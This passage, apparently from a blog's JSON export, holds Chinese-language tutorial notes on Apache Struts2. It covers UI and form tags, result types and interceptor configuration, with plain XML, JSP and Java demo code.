Demo参考：https://www.w3cschool.cn/struts_2/struts_text_tag.html url标签这些url标签用于创建URL。 1234567891011121314&lt;-- Example 1 --&gt;&lt;s:url value=\"editGadget.action\"&gt; &lt;s:param name=\"id\" value=\"%&#123;selected&#125;\" /&gt;&lt;/s:url&gt;&lt;-- Example 2 --&gt;&lt;s:url action=\"editGadget\"&gt; &lt;s:param name=\"id\" value=\"%&#123;selected&#125;\" /&gt;&lt;/s:url&gt;&lt;-- Example 3--&gt;&lt;s:url includeParams=\"get\"&gt; &lt;s:param name=\"id\" value=\"%&#123;'22'&#125;\" /&gt;&lt;/s:url&gt; Demo参考：https://www.w3cschool.cn/struts_2/struts_url_tag.html a标签&lt;s:a&gt; 标签与 HTML 中的 &lt;a&gt; 标签类似，主要用于构造 HTML 页面中的超链接。&lt;s:a&gt; 标签的属性及相关说明如表所示。 &lt;s:a&gt; 标签的使用格式如下所示： 12&lt;s:a href=\"链接地址\"&gt;&lt;/s:a&gt;&lt;s:a namespace=\"\" action=\"\"&gt;www.baidu.com&lt;/s:a&gt; debug标签&lt;s:debug&gt; 标签用于输出服务端对象（如 request、application、ValueStack 等）中的信息，该标签可用于辅助调试 Java Web 程序。 &lt;s:debug&gt; 标签只有一个 id 属性，表示 &lt;s:debug&gt; 标签的一个引用，通常不使用该属性。在使用 &lt;s:debug&gt;标签后，网页中会生成一个 Debug 的链接，单击该链接，网页中将输出各种服务器对象的信息，如图所示。 0x04 表单标签表单标签列表是Struts UI标签的子集。Struts2 的表单标签用于向服务器提交用户输入的信息，绝大多数的表单标签都有其对应的 HTML 标签。 Struts2的模板和主题Struts2 的 UI 标签都是基于模板和主题的。模板就是一些代码，Struts2 标签使用这些代码渲染生成相应的 HTML 代码。模板是一个 UI 标签的外在表现形式，并且每个标签都会有自己对应的模板。如果为所有的 UI 标签提供样式和视觉效果相似的模板，那么这一系列的模板就形成了一个主题。 Struts2 默认提供了四种主题，分别为 simple、xhtml、css_xhtml 和 Ajax，这四种主题的作用如下表所示。 名称 作用 simple 主题 这是最简单的主题，使用该主题时，每个 UI 标签只生成最基本的 HTML 元素，没有任何附加功能。 xhtml 主题 这是 Struts2 的默认主题，它对 simple 主题进行了扩展，提供了布局功能、Label 显示名称以及与验证框架和国际化框架的集成。 css_xhtml 该主题是对 xhtml 的扩展，在 xhtml 的基础之上添加对 CSS 的支持和控制。 Ajax 继承自 xhtml，提供 Ajax 支持。 在上述四种主题中，xhtml 是默认主题，但它有一定的局限性，因为它使用表格进行布局，并且只支持每一行放一个表单项，一旦遇到复杂的页面布局，xhtml 就不再适用了。此时，就需要改变 Struts2 的默认主题。 通常情况下，可以通过设置常量 struts.ui.theme 改变默认主题，具体方法是在 struts.xml 文件中增加相应的配置。例如想要使用 simple 的主题，那么只需要在 struts.xml 中增加如下配置即可。 1&lt;constant name=\"struts.ui.theme\" value=\"simple\"/&gt; 表单标签的公共属性每一个表单标签在 Struts2 核心 JAR 文件的 org.apache.struts2.components 包中都有一个对应的类，这些对应的类都继承自 UIBean 类。 UIBean 类提供了一组公共属性，这些属性是所有表单标签的通用属性，具体如表所示。 属性名 主题 数据类型 说 明 title simple String 设置表单元素的 title 属性 disabled simple String 设置表单元素是否可用 label xhtml String 设置表单元素的 label 属性 labelPosition xhtml String 设置 label 元素的显示位置，可选值为 top 和 left（默认） name simple String 设置表单元素的 name 属性，与 Action 中的属性名对应 value simple String 设置表单元素的值 cssClass simple String 设置表单元素的 class cssStyle simple String 设置表单元素的 style 属性 required xhtml Boolean 设置表单元素为必填项 requiredposition xhtml String 设置必填标记（默认为*）相对于 label 元素的位置，可选值为 left 和 right（默认） tabindex simple String 设置表单元素的 tabindex 属性 需要注意的是，表单标签的 name 和 value 属性基本等同于 HTML 组件的 name 和 value，但也有所不同：表单标签在生成 HTML 时，如果标签没有设置 value 属性，则会从值栈中按照 name 获取相应的值，并把这个值设置成 HTML 组件的 value。 简单而言，就是表单标签的 value 在生成 HTML 时会自动设置值，而这个值是从值栈中获取的。 form标签form标签用于呈现 HTML 语言中的表单元素，其常用属性如表所示。 属性名 是否必填 类 型 说 明 action 否 String 指定提交时对应的 action，不需要 action 后缀 enctype 否 String HTML 表单 enctype 属性 method 否 String HTML 表单 method 属性 namespace 否 String 所提交 action 的命名空间 在使用form标签时，一般会包含其他的表单元素，如 textfield和radio等标签。在提交表单时，这些表单元素对应的 name 属性，将其作为参数传入 Struts2 框架进行处理。 textfield和textarea标签textfield和 textarea标签的作用比较相似，都用于创建文本框，其主要区别在于textfield创建的是单行文本框，而textarea创建的是多行文本框。二者的使用也比较简单，一般只需要指定其 label 和 name 属性即可。两个标签的用法如下所示。 textfield标签的用法： 1&lt;s:textfield label=\"用户名\" name=\"username\"/&gt; textarea标签的用法： 1&lt;s:textarea label=\"描述\" name=\"description\"/&gt; 在上述两个用法中，name 属性用于指定单行/多行文本框的名称，在 Action 中，通过 name 属性即可获取单行/多行文本框的值。 此外，textarea标签还可以通过 value 属性指定单行/多行文本框的当前值，通过 cols 和 rows 属性分别指定多行文本框的列数和行数。 passWord标签 password标签用于创建一个密码输入框，它可以生成 HTML 中的 &lt;input type=&quot;password&quot;/&gt; 标签。 password标签的常用属性说明如表所示。 password标签的使用方法如下所示： 1&lt;s:password label=\"password\" name=\"password\" maxlength=\"20\"/&gt; 需要注意的是，Struts2 的 password 标签与 HTML 的 input type=&quot;password&quot;/&gt; 标签也略有不同：&lt;input type=&quot;password&quot;/&gt; 标签只要设置 value 属性就可以将 value 的属性值作为默认显示值；而 Struts2 的 password 标签除了要设置 value 属性值以外，还要设置 showPassword 属性值为 true。 radio标签radio标签用于创建单选按钮，生成 HTML 中的 &lt;input type=&quot;radio&quot;/&gt; 标签。radio 标签的常用属性说明如表所示。 属性名 是否必填 类 型 说 明 list 是 Collection，Map Enmumeration，Iterator，Array 用于生成单选框中的集合 listKey 否 String 指定集合对象中的哪个属性作为选项的 value listValue 否 String 指定集合对象中的哪个属性作为选项的内容 表中的三个属性必须要配合使用，由 list 属性指定从集合中获得元素，由 listKey 属性指定获得元素之后使用元素的哪个属性作为生成 &lt;input type=&quot;radio&quot;/&gt; 的 value 属性，由 listValue 属性指定生成的 &lt;input type=&quot;radio&quot;/&gt; 后展示给用户的内容。 reset标签reset标签用于创建一个重置按钮，会生成 HTML 中的 &lt;input type=&quot;reset&quot;/&gt; 标签，该标签的使用比较简单，其常用属性为 name 和 value。 其中，name 属性用于指定重置按钮的名称，在 Action 中，可以通过 name 属性获取重置按钮的值，value 属性用于显示按钮的值。该标签的用法如下所示： 12&lt;s:reset value=\"reset\"/&gt;&lt;s:reset name=\"reset\" value=\"重置\"/&gt; submit标签submit标签主要用于产生 HTML 中的提交按钮，该表单元素中，可以指定提交时的 Action 对应的方法。该标签通常与 form 标签一起使用，该标签的常用属性如表所示。 checkboxlist标签 checkboxlist标签用于一次性创建多个复选框，用户可以选择创建零到多个复选框，它可以产生一组&lt;input type=&quot;checkbox&quot;/&gt;标签。 checkboxlist标签的常用属性及其说明如表所示。 在表的属性中，listKey 和 listValue 属性主要用于集合中，通常存放的是 JavaBean，可以使用这两个属性从 JavaBean 的众多属性中筛选需要的值。 select标签select标签用于创建一个下拉列表框，它会生成 HTML 中的 &lt;select&gt; 标签。select标签的常用属性及其说明如表所示。 在表的属性中，headerKey 和 headerValue 属性需要同时使用，使用时会在所有的真实选项之前加添一项作为标题项。如选择城市时，可以在所有的具体城市之前添加一项“请选择”，这一项不会作为备选的值。 size 属性可以让下拉框同时显示多个值，multiple 属性让用户同时选择多个值，只是在后台的 Action 接收下拉框值时，不能使用 String 类型，而是使用 String[] 或者 List&lt;String&gt;。 optgroup标签optgroup标签用于生成选项组，通常作为 select 标签的子标签使用。由于在一个下拉列表框中可以包含多个选项组，所以 select 标签也能够包含多个 optgroup 标签。 使用 optgroup 标签时，也需要指定该标签的 list、listKey、listValue 等属性，这些属性的含义与 select 标签的相应属性含义相同。此外，optgroup 标签的 label 属性表示选项组的组名，选项组的组名是不能被选中的。 file标签file标签用于创建一个文件选择框，它会生成 HTML 中的 &lt;input type=&quot;file&quot;/&gt; 标签。该标签常用的属性及其说明如表所示。 file标签的一般用法如下所示： 12&lt;s:file name=\"uploadFile\" accept=\"text/*\"/&gt;&lt;s:file name=\"otherUploadFile\" accept=\"text/html,text/plain\"/&gt; hidden标签hidden标签用于创建隐藏表单元素，它会生成 HTML 中的隐藏域标签 &lt;input type=&quot;hidden&quot;/&gt;。该标签在页面上没有任何显示，可用于保存或交换数据，如需要提交表单时，要传递一个值到请求参数中，就可以使用该标签。 该标签的使用非常简单，通常只需要设置 name 和 value 属性即可，其使用语法如下所示： 1&lt;s:hidden name=\"id\" value=\"%&#123;id&#125;\"/&gt; 0x05 非表单标签Struts2 的非表单标签主要用于在页面中生成非表单的可视化元素，以及输出在 Action 中封装的信息，如输出错误提示信息等。 常用的非表单标签有 &lt;s:actionmessage&gt;、&lt;s:actionerror&gt; 和 &lt;s:fielderror&gt; 标签，它们分别用于显示动作信息、动作错误信息和字段错误信息。如果信息为空，则不显示。各标签的具体功能介绍如下。 &lt;s:actionmessage&gt; 标签：如果 Action 实例的 getActionMessage() 方法返回不为 null，则该标签负责输出该方法返回的系列消息。 &lt;s:actionerror&gt; 标签：如果 Action 实例的 getActionError() 方法返回不为 null，则该标签负责输出该方法返回的系列错误。 &lt;s:fielderror&gt; 标签：如果 Action 实例存在表单域的类型转换错误和校验错误，则该标签负责输出这些错误提示。 Demo新建MsgAction类，分别使用了addActionMessage、addActionError 和 addFieldError 三个方法输出错误信息： 123456789101112package com.mi1k7ea.action;import com.opensymphony.xwork2.ActionSupport;public class MsgAction extends ActionSupport &#123; public String execute() throws Exception &#123; this.addActionMessage(\"&lt;s:actionmessage&gt;标签输出的内容\"); this.addActionError(\"&lt;s:actionerror&gt;标签输出的内容\"); this.addFieldError(\"msg\", \"&lt;s:fielderror&gt;标签输出的内容\"); return SUCCESS; &#125;&#125; 新建non_formTags.jsp： 12345678910111213141516&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;&lt;%@taglib prefix=\"s\" uri=\"/struts-tags\" %&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;errorTags&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;s:actionmessage/&gt;&lt;s:actionerror/&gt;&lt;s:fielderror/&gt;&lt;s:fielderror value=\"msg\"/&gt;&lt;!-- 有无value效果一样 --&gt;&lt;/body&gt;&lt;/html&gt; 修改struts.xml文件： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt;&lt;struts&gt; &lt;constant name=\"struts.devMode\" value=\"true\" /&gt; &lt;package name=\"helloworld\" extends=\"struts-default\"&gt; &lt;action name=\"msg\" class=\"com.mi1k7ea.action.MsgAction\"&gt; &lt;result&gt;/non_formTags.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 效果：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://www.mi1k7ea.com/tags/Struts2/"}]},{"title":"Struts2基础篇之ResultType（结果类型）","date":"2020-07-03T13:38:51.000Z","path":"2020/07/03/Struts2基础篇之ResultType（结果类型）/","text":"0x00 参考本笔记直接参考或引自如下链接文章： http://c.biancheng.net/struts2/ https://www.w3cschool.cn/struts_2/ 0x01 ResultType简介ResultType即结果类型。 &lt;results&gt;标签在Struts2 MVC框架中扮演视图的角色。Action负责执行业务逻辑，下一步就是使用&lt;results&gt;标签显示视图。 Struts提供了许多预定义的结果类型，我们已经看到的是默认的结果类型dispatcher，它用于分发到JSP页面。Struts2允许你使用其他标记语言为视图技术呈现结果，较常选用的包括Velocity，Freemaker，XSLT和Tiles。 0x02 配置Result在 struts.xml 文件中，&lt;result&gt; 元素用于配置 Result 逻辑视图与物理视图之间的映射关系，它有两个可选属性 name 和 type。其中，name 属性用于指定逻辑视图的名称，默认值为 success；type 属性用于指定返回的视图资源的类型，不同的类型代表不同的结果输出，它的默认值是 dispatcher。 struts.xml 文件中的 &lt;result&gt; 元素配置示例代码如下所示： 12345&lt;action name=\"loginAction\" class=\"com.mi1k7ea.LoginAction\"&gt; &lt;result name=\"success\" type=\"dispatcher\"&gt; &lt;param name=\"location\"&gt;/success.jsp&lt;/param&gt; &lt;/result&gt;&lt;/action&gt; 上述代码为 Action 配置了一个 name 为 success 的 Result 映射，该映射的值可以是 JSP 页面，也可以是一个 Action 的 name 值；这里使用 param 子元素为其指定了 Result 映射对应的物理视图资源为 success.jsp。 &lt;param&gt; 子元素的 name 属性有两个值，分别如下： location：指定该逻辑视图所对应的实际视图资源。 parse：指定在逻辑视图资源名称中是否可以使用 OGNL（对象图导航语言）表达式。默认值为 true，表示可以使用，如果设为 false，则表示不支持。 其实，上述配置代码还可以简化为如下形式： 123&lt;action name=\"loginAction\" class=\"com.mi1k7ea.LoginAction\"&gt; &lt;result&gt;/success.jsp&lt;/result&gt;&lt;/action&gt; 需要注意的是，在 Result 配置中指定实际资源位置时，可以使用绝对路径，也可以使用相对路径。 绝对路径以斜杠“/”开头，例如&lt;result&gt;/success.jsp&lt;/result&gt;，相当于当前 Web 应用程序的上下文路径。 相对路径不以斜杠“/”开头，例如 &lt;result&gt;success.jsp&lt;/result&gt;，相当于当前执行的 Action 路径。 0x03 预定义的ResultType在使用 Struts2 框架编写项目时，当框架调用 Action 对请求进行处理后，就要向用户呈现一个结果视图。在 Struts2 中，预定义了多种 ResultType（结果类型）展示结果视图。 一个结果类型就是实现了 com.opensymphony.xwork2.Result 接口的类，Struts2 把内置的 &lt;result-type&gt; 都放在 struts-default 包中，struts-default 包就是配置包的父包，这个包定义在 struts2-core-2.3.24.jar 包的根目录下的 struts-default.xml 文件中，在该文件中可以找到相关的 &lt;result-type&gt; 的定义，其代码如下所示： 12345678910111213&lt;result-types&gt; &lt;result-type name=\"chain\" class=\"com.opensymphony.xwork2.ActionChainResult\"/&gt; &lt;result-type name=\"dispatcher\" class=\"org.apache.struts2.dispatcher.ServletDispatcherResult\" default=\"true\"/&gt; &lt;result-type name=\"freemarker\" class=\"org.apache.struts2.views.freemarker.FreemarkerResult\"/&gt; &lt;result-type name=\"httpheader\" class=\"org.apache.struts2.dispatcher.HttpHeaderResult\"/&gt; &lt;result-type name=\"redirect\" class=\"org.apache.struts2.dispatcher.ServletRedirectResult\"/&gt; &lt;result-type name=\"redirectAction\" class=\"org.apache.struts2.dispatcher.ServletActionRedirectResult\"/&gt; &lt;result-type name=\"stream\" class=\"org.apache.struts2.dispatcher.StreamResult\"/&gt; &lt;result-type name=\"velocity\" class=\"org.apache.struts2.dispatcher.VelocityResult\"/&gt; &lt;result-type name=\"xslt\" class=\"org.apache.struts2.views.xslt.XSLTResult\"/&gt; &lt;result-type name=\"plainText\" class=\"org.apache.struts2.dispatcher.PlainTextResult\" /&gt; &lt;result-type name=\"postback\" class=\"org.apache.struts2.dispatcher.PostbackResult\" /&gt;&lt;/result-types&gt; 在上述代码中，每个 &lt;result-type&gt; 元素都是一种视图技术或者跳转方式的封装，其中 name 属性指出在 &lt;result&gt; 元素中如何引用这种视图技术或者跳转方式，它对应着 &lt;result&gt; 元素的 type 属性。class 属性表示这种结果类型的对应类。 Struts2 中预定义的 ResultType 说明如表所示。 属 性 说 明 chain 用于处理 Action 链，被跳转的 Action 中仍能获取上个页面的值，如 request 信息 dispatcher 用于转向页面，通常处理 JSP，是默认的结果类型 freemarker 用于整合 FreeMarker 模板结果类型 httpheader 用于处理特殊的 HTTP 行为结果类型 redirect 重定向到一个 URL，被跳转的页面中丢失传递的信息 redirectAction 重定向到一个 Action，跳转的页面中丢失传递的信息 stream 向浏览器发送 InputStream 对象，通常用于处理文件下载，还可用于 Ajax 数据 velocity 用于整合 Velocity 模板结果类型 xslt 用于整合 XML/XSLT 结果类型 plainText 显示原始文件内容，如文件源代码 postback 使当前请求参数以表单形式提交 表中列举了 Struts2 中预定义的全部 11 种结果类型，其中 dispatcher 是默认的结果类型，主要用于与 JSP 整合。在这全部 11 种结果类型中，dispatcher 和 redirect 是比较常用的结果类型。 需要注意的是，redirect 与 dispatcher 结果类型非常相似，所不同的是 dispatcher 结果类型是将请求转发到 JSP 视图资源，而 redirect 结果类型是将请求重定向到 JSP 视图资源。如果重定向了请求，那么将丢失所有参数，包括 Action 的处理结果。 0x04 dispatcher结果类型dispatcher 是 Struts2 的默认结果类型，它用于表示转发到指定结果资源。 由于 Struts2 在后台使用 RequestDispatcher 的 forward() 方法转发请求，所以在用户的整个请求/响应过程中，保持的是同一个请求对象，即目标 JSP/Servlet 接收到的请求/响应对象与最初的 JSP/Servlet 的请求/响应对象相同。 dispatcher 结果类型的对应类是 org.apache.struts2.dispatcher.ServletDispatcherResult，该类有 location 和 parse 两个属性，可以通过 struts.xml 配置文件中的 &lt;result&gt; 元素的 &lt;param&gt; 子元素设置，代码如下所示： 1234&lt;result name=\"success\" type=\"dispatcher\"&gt; &lt;param name=\"location\"&gt;/success.jsp&lt;/param&gt; &lt;param name=\"parse\"&gt;true&lt;/param&gt;&lt;/result&gt; 在上述代码中，location 参数用于指定 Action 执行完毕后要转向的目标资源；parse 参数是一个布尔类型的值，默认是 true，表示解析 location 参数中的 OGNL 表达式，如果为 false，则不解析。 0x05 redirect结果类型redirect 结果类型用于重定向到指定的结果资源，该资源可以是 JSP 文件，也可以是 Action 类。使用 redirect 结果类型时，系统将调用 HttpServletResponse 的 sendRedirect() 方法将请求重定向到指定的 URL。 redirect 结果类型的对应类是 org.apache.struts2.dispatcher.ServletRedirectResult。在使用 redirect 时，用户要完成一次和服务器之间的交互，浏览器需要发送两次请求，请求过程如图： 使用 redirect 结果类型的工作过程如下。 浏览器发出一个请求，Struts2框架调用对应的Action实例对请求进行处理。 Action返回success结果字符串，Struts2框架根据这个结果选择对应的结果类型，这里使用的是redirect结果类型。 ServletRedirectResult在内部使用HttpServletResponse的sendRedirect()方法将请求重新定向到目标资源。 浏览器重新发起一个针对目标资源的新请求。 目标资源作为响应呈现给用户。 Demo案例参考：http://c.biancheng.net/view/4101.html 0x06 Freemaker结果类型Freemaker是一个流行的模板引擎，使用预定义的模板生成输出。 Demohello.fm，FreeMarker模板文件： 1This is FreeMarker test, $&#123;name&#125; HelloWorldAction类： 1234567891011121314151617package com.mi1k7ea.domain;public class HelloWorldAction&#123; private String name; public String execute() throws Exception &#123; return \"success\"; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; index.jsp： 123456789101112131415161718&lt;%@ page language=\"java\" contentType=\"text/html; charset=ISO-8859-1\" pageEncoding=\"ISO-8859-1\"%&gt;&lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello World&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Hello World From Struts2&lt;/h1&gt;&lt;form action=\"hello\"&gt; &lt;label for=\"name\"&gt;Please enter your name&lt;/label&gt;&lt;br/&gt; &lt;input type=\"text\" name=\"name\"/&gt; &lt;input type=\"submit\" value=\"Say Hello\"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 配置struts.xml： 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt;&lt;struts&gt; &lt;constant name=\"struts.devMode\" value=\"true\" /&gt; &lt;package name=\"helloworld\" extends=\"struts-default\"&gt; &lt;action name=\"hello\" class=\"com.mi1k7ea.domain.HelloWorldAction\" method=\"execute\"&gt; &lt;result name=\"success\" type=\"freemarker\"&gt; &lt;param name=\"location\"&gt;/hello.fm&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 效果如下，看到渲染与JSP视图完全相同，只是我们不绑定使用JSP作为视图技术：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://www.mi1k7ea.com/tags/Struts2/"}]},{"title":"Struts2基础篇之Interceptor（拦截器）","date":"2020-07-03T13:38:03.000Z","path":"2020/07/03/Struts2基础篇之Interceptor（拦截器）/","text":"0x00 参考本笔记直接参考或引自如下链接文章： http://c.biancheng.net/struts2/ https://www.w3cschool.cn/struts_2/ 0x01 Interceptor简介Interceptor即拦截器。 在 Struts2 框架中，拦截器是其重要的组成部分，Struts2 的很多功能（数据校验、对象类型转换、文件上传等）都是构建在拦截器之上的。 通常情况下，开发者通过 Struts2 内建的拦截器可以完成大部分的操作，只有在内建拦截器不能满足需求时，才会自己扩展。可以这么说，Struts2 框架的简单易用，与拦截器的作用是分不开的。 拦截器（Interceptor）是 Struts2 框架的核心组成部分，它类似于 Servlet 中的过滤器，是一种可以在请求之前或之后执行的 Struts2 的组件，也可以将其理解为动态拦截 Action 调用的对象。 在早期的 MVC 框架中，通常会将一些通用的操作（如类型转换、数据校验、解析上传的文件等）强制写在控制器中，而这些常用操作又不是所有的请求都需要实现的，这就导致了框架的灵活性不足、可扩展性低等问题。 在 Struts2 框架中，这些通用的核心功能都放到了拦截器中实现，而不是集中放在核心控制器中实现。 由于框架中各个功能对应的拦截器是分开定义的，每个拦截器都可以完成单个功能，并且可以自由选择、灵活组合，而需要哪些拦截器时，只要在 struts.xml 配置文件中指定即可，所以 Struts2 框架的使用十分灵活。同时，由于在 Struts2 框架中支持自定义拦截器，所以其扩展性十分强大。 当多个拦截器组合在一起时就形成了拦截器链（Interceptor Chain）或拦截器栈（Interceptor Stack）。 拦截器链就是指对应各个功能的拦截器按照一定的顺序排列在一起形成的链，而拦截器链组成的集合就是拦截器栈。当有适配连接器栈的访问请求进来时，这些拦截器就会按照之前定义的顺序被调用。 在通常情况下，拦截器都是以代理方式调用的，它在一个 Action 执行前后进行拦截，围绕着 Action 和 Result 的执行而执行，其工作方式如图下所示。 从图下中可以看出，Struts2 拦截器的实现原理与 Servlet 过滤器的实现原理类似，它以链式执行，对真正要执行的方法（execute()）进行拦截。 在执行 Action 的 execute() 方法之前会执行一次拦截，在 Action 和 Result 执行之后，拦截器会再次执行（与先前的调用顺序相反）。在此链式执行的过程中，每一个拦截器都可以直接返回，从而终止余下的拦截器、Action 及 Result 的执行。 0x02 Interceptor的配置和使用拦截器要使用拦截器，首先要对它进行配置。拦截器的配置是在 struts.xml 文件中完成的，它通常以 &lt;interceptor&gt; 标签开头，以 &lt;/interceptor&gt; 标签结束。定义拦截器的语法格式如下所示： 123&lt;interceptor name=\"interceptorName\" class=\"interceptorClass\"&gt; &lt;param name=\"paramName\"&gt;paramValue&lt;/param&gt;&lt;/interceptor&gt; 上述语法格式中，&lt;interceptor&gt; 元素的 name 属性用于指定拦截器的名称，class 属性用于指定拦截器的实现类。有时，在定义拦截器时需要传入参数，这时需要使用 &lt;param&gt; 标签，其中 name 属性用于指定参数的名称，paramValue 表示参数的值。 拦截器栈在实际的项目开发中，经常需要在 Action 执行之前执行多个拦截动作，如登录日志记录、权限管理等。 为了方便代码管理和程序的执行，开发者通常会将这些拦截器组成一个拦截器栈，在使用时，可以将栈内的多个拦截器当成一个整体引用。当拦截器栈被附加到一个 Action 上时，在执行 Action 之前必须先执行拦截器栈中的每一个拦截器。 定义拦截器栈使用 &lt;interceptors&gt; 元素和 &lt;interceptor-stack&gt; 子元素，当配置多个拦截器时，需要使用 &lt;interceptor-ref&gt; 元素指定多个拦截器，配置语法如下所示： 123456&lt;interceptors&gt; &lt;interceptor-stack name=\"interceptorStackName\"&gt; &lt;interceptor-ref name=\"interceptorName\"/&gt; ... &lt;/interceptor-stack&gt;&lt;/interceptors&gt; 在上述语法中，interceptorStackName 值表示配置的拦截器栈的名称；interceptorName 值表示拦截器的名称。除此之外，在一个拦截器栈中还可以包含另一个拦截器栈，示例代码如下所示： 12345678910111213&lt;package name=\"default\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;!--声明拦截器--&gt; &lt;interceptors&gt; &lt;interceptor name=\"interceptor1\" class=\"interceptorClass\"/&gt; &lt;interceptor name=\"interceptor2\" class=\"interceptorClass\"/&gt; &lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt; &lt;interceptor-stack name=\"myStack\"&gt; &lt;interceptor-ref name=\"defaultStack\"/&gt; &lt;interceptor-ref name=\"interceptor1\"/&gt; &lt;interceptor-ref name=\"interceptor2\"/&gt; &lt;/interceptor-stack&gt; &lt;/interceptors&gt;&lt;/package&gt; 在上述代码中，定义的拦截器栈的名称是 myStack，在 myStack 栈中，除了引用了两个自定义的拦截器 interceptor1 和 interceptor2 以外，还引用了一个内置拦截器栈 defaultStack，这个拦截器是必须要引入的。 默认拦截器如果想对一个包下的 Action 使用相同的拦截器，则需要为该包中的每个 Action 都重复指定同一个拦截器，这样写显然过于繁琐。为了解决此问题，Struts2 中支持使用默认拦截器，它可以对其指定的包中的所有 Action 都起到拦截作用。 一旦为某一个包指定了默认拦截器，并且该包中的 Action 未显示指定拦截器，则会使用默认拦截器。反之，若此包中的 Action 显示的指定了某个拦截器，则该默认拦截器将会被屏蔽。此时，如果还想使用默认拦截器，则需要用户手动配置该默认拦截器的引用。 配置默认拦截器需要使用 &lt;default-interceptor-ref&gt; 元素，此元素为 &lt;package&gt; 元素的子元素。其语法格式如下所示： 1&lt;default-interceptor-ref name=\"拦截器（栈）的名称\"/&gt; 在上述语法格式中，name 属性的值必须是已经存在的拦截器或拦截器栈的名称。下面用该语法格式配置一个默认拦截器，示例代码如下所示： 123456789101112131415161718&lt;package name=\"default\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;!--声明拦截器--&gt; &lt;interceptors&gt; &lt;interceptor name=\"interceptor1\" class=\"interceptorClass\"/&gt; &lt;interceptor name=\"interceptor2\" class=\"interceptorClass\"/&gt; &lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt; &lt;interceptor-stack name=\"myStack\"&gt; &lt;interceptor-ref name=\"defaultStack\"/&gt; &lt;interceptor-ref name=\"interceptor1\"/&gt; &lt;interceptor-ref name=\"interceptor2\"/&gt; &lt;/interceptor-stack&gt; &lt;/interceptors&gt; &lt;!--配置包下的默认拦截器，既可以是拦截器，也可以是拦截器栈--&gt; &lt;default-interceptor-ref name=\"myStack\"/&gt; &lt;action name=\"login\" class=\"com.mi1k7ea.LoginAction\"&gt; &lt;result name=\"input\"&gt;/login.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt; 在上述代码中，指定了包下面的默认拦截器为一个拦截器栈，该拦截器栈将会作用于包下所有的 Action。 注意：每一个包下只能定义一个默认拦截器，如果需要多个拦截器作为默认拦截器，则可以将这些拦截器定义为一个拦截器栈，再将这个拦截器栈作为默认拦截器即可。 0x03 内建拦截器Struts2 框架中内置了许多拦截器，这些拦截器以 name-class 对的形式配置在 struts-default.xml 文件中，其中，name 是拦截器的名称，也就是引用的名字；class 指定了该拦截器所对应的实现。 只要自定义的包继承了 Struts2 的 struts-default 包，就可以使用包中定义的内建拦截器，否则需要自行定义拦截器。 内建拦截器的介绍在 struts-default.xml 中，每一个拦截器都具有不同的意义，如下表： 名 称 说 明 alias 在不同请求之间将请求参数在不同名称间转换，请求内容不变 autowiring 用于实现 Action 的自动装配 chain 让前一个 Action 的属性可以被后一个 Action 访问，现在和 chain 类型的 result() 结合使用 conversionError 将错误从 ActionContext 中添加到 Action 的属性字段中 cookies 使用配置的 Name 和 Value 指定 Cookies cookieProvider 该类是一个 Cookie 工具，方便开发者向客户端写 Cookie clearSession 用于清除一个 HttpSession 实例 createSession 自动创建 HttpSession，用于为需要使用 HttpSession 的拦截器服务 debugging 提供不同的调试用的页面展现内部的数据状况 execAndWait 在后台执行 Action，同时将用户带到一个中间的等待页面 exception 将异常定位到一个画面 fileUpload 提供文件上传功能 il8n 记录用户选择的 locale logger 输出 Action 的名称 model-driven 如果一个类实现了 Model Driven，将 get Model 得到的结果放在 Value Slack 中 scoped-model-driven 如果一个 Action 实现了 ScopedModelDriven，则这个拦截器会从相应的 Scope 中取 出 model 调用 Action 的 setModel 方法，将其放入 Action 内部 params 将请求中的参数设置到 Action 中 actionMappingParams 用于负责在 Action 配置中传递参数 prepare 如果 Action 实现了 Preparable，则该拦截器调用 Action 类的 prepare 方法 staticParams 将 struts.xml 文件中 标签的参数内容设置到对应的 Action 中 scope 将 Action 状态存入 session 和 application 范围 servletConfig 提供访问 HttpServletRequest 和 HttpServletResponse 方法，以 Map 方式访问 timer 输岀 Action 执行的时间 token 通过 Token 避免双击 tokenSession 和 Token Interceptor 一样，不过双击时把请求的数据存储在 Session 中 validation 使用 action-validation.xml 文件中定义的内容校验提交的数据 workflow 调用 Action 的 validate 方法，一旦有错谋返回，则重新定位到 INPUT 画面 store 存储或者访问实现 ValidalionAware 接口的 Action 类出现的消息、错误和字段错误等 checkbox 添加了 checkbox 自动处理代码，将没有选中的 checkbox 